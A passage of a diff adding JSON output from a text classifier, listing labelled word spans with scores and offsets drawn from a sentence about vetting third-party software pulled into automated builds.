+      "score": 0.5687293410301208,
+      "start": 9611,
+      "end": 9615
+    },
+    {
+      "entity": "remain",
+      "type": "LABEL_1",
+      "score": 0.5185796022415161,
+      "start": 9616,
+      "end": 9622
+    },
+    {
+      "entity": "vigilant - checking each piece of software",
+      "type": "LABEL_0",
+      "score": 0.6287641525268555,
+      "start": 9623,
+      "end": 9665
+    },
+    {
+      "entity": "that we pull",
+      "type": "LABEL_1",
+      "score": 0.6345512270927429,
+      "start": 9666,
+      "end": 9678
+    },
+    {
+      "entity": "into",
+      "type": "LABEL_0",
+      "score": 0.7148017287254333,
+      "start": 9679,
+      "end": 9683
+    },
+    {
+      "entity": "our",
+      "type": "LABEL_1",
+      "score": 0.6739718914031982,
+      "start": 9684,
+      "end": 9687
+    },
+    {
+      "entity": "builds",
+      "type": "LABEL_0",
+      "score": 0.5663756728172302,
+      "start": 9688,
+      "end": 9694
+    },
+    {
+      "entity": "in",
+      "type": "LABEL_1",
+      "score": 0.6384797096252441,
+      "start": 9695,
+      "end": 9697
+    },
+    {
+      "entity": "an",
+      "type": "LABEL_0",
+      "score": 0.572342038154602,
+      "start": 9698,
+      "end": 9700
+    },
+    {
+      "entity": "automated",
+      "type": "LABEL_1",
+      "score": 0.6466615200042725,
+      "start": 9701,
+      "end": 9710
+    },
+    {
+      "entity": "fashion",
+      "type": "LABEL_0",
+      "score": 0.5145019292831421,
+      "start": 9711,
+      "end": 9718
+    },
+    {
+      "entity": ", to",
+      "type": "LABEL_1",
+      "score": 0.6655611991882324,
+      "start": 9718,
+      "end": 9722
+    },
+    {
+      "entity": "block threats at the source",
+      "type": "LABEL_0",
+      "score": 0.7536898851394653,
+      "start": 9723,
+      "end": 9750
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.6510573029518127,
+      "start": 9750,
+      "end": 9751
+    },
+    {
+      "entity": "with",
+      "type": "LABEL_0",
+      "score": 0.5169694423675537,
+      "start": 9754,
+      "end": 9758
+    },
+    {
+      "entity": "this in",
+      "type": "LABEL_1",
+      "score": 0.663617730140686,
+      "start": 9759,
+      "end": 9766
+    },
+    {
+      "entity": "mind",
+      "type": "LABEL_0",
+      "score": 0.6477475166320801,
+      "start": 9767,
+      "end": 9771
+    },
+    {
+      "entity": ", we",
+      "type": "LABEL_1",
+      "score": 0.6444919109344482,
+      "start": 9771,
+      "end": 9775
+    },
+    {
+      "entity": "’ ll",
+      "type": "LABEL_0",
+      "score": 0.6815141439437866,
+      "start": 9775,
+      "end": 9778
+    },
+    {
+      "entity": "leave",
+      "type": "LABEL_1",
+      "score": 0.5391770601272583,
+      "start": 9779,
+      "end": 9784
+    },
+    {
+      "entity": "all the",
+      "type": "LABEL_0",
+      "score": 0.6961109638214111,
+      "start": 9785,
+      "end": 9792
+    },
+    {
+      "entity": "attackers",
+      "type": "LABEL_1",
+      "score": 0.5602322816848755,
+      "start": 9793,
+      "end": 9802
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_0",
+      "score": 0.7034367322921753,
+      "start": 9803,
+      "end": 9804
+    },
+    {
+      "entity": "who",
+      "type": "LABEL_1",
+      "score": 0.5579297542572021,
+      "start": 9805,
+      "end": 9808
+    },
+    {
+      "entity": "i ’",
+      "type": "LABEL_0",
+      "score": 0.6452592015266418,
+      "start": 9809,
+      "end": 9811
+    },
+    {
+      "entity": "m sure",
+      "type": "LABEL_1",
+      "score": 0.5741946697235107,
+      "start": 9811,
+      "end": 9817
+    },
+    {
+      "entity": "are",
+      "type": "LABEL_0",
+      "score": 0.6104868054389954,
+      "start": 9818,
+      "end": 9821
+    },
+    {
+      "entity": "reading this",
+      "type": "LABEL_1",
+      "score": 0.7359503507614136,
+      "start": 9822,
+      "end": 9834
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_0",
+      "score": 0.7333478927612305,
+      "start": 9835,
+      "end": 9836
+    },
+    {
+      "entity": "with",
+      "type": "LABEL_1",
+      "score": 0.5106088519096375,
+      "start": 9837,
+      "end": 9841
+    },
+    {
+      "entity": "the following",
+      "type": "LABEL_0",
+      "score": 0.8021541833877563,
+      "start": 9842,
+      "end": 9855
+    },
+    {
+      "entity": ":.",
+      "type": "LABEL_1",
+      "score": 0.6167293190956116,
+      "start": 9855,
+      "end": 9857
+    }
+  ]
+}
